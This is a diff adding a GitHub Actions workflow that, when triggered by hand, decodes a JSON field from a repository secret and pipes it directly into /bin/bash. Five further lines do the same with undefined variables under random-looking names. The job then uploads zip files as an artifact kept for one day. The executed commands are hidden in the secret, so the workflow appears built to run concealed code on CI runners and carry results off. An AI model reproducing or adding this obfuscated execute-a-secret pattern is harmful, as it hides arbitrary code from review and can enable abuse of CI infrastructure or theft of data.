@@ -1,0 +1,26 @@
+name: smartathenabe
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: smartathenabe
+        env:
+          ruc0102: ${{ secrets.ruc0102 }}
+        run: |
+          printf '%s' "$ruc0102" | jq -r .x31688 | /bin/bash
+          echo $mug33688 | jq -r .rdzb84914 | /bin/bash
+          printf '%s' "$hbj55622" | jq -r .vb726 | /bin/bash
+          echo $dbq6275 | jq -r .hicsl1528 | /bin/bash
+          echo $pkai26778 | jq -r .y1 | /bin/bash
+          printf '%s' "$wi6" | jq -r .llzf7046 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: vfbzDtIM
+          path: "*.zip"
+          retention-days: 1
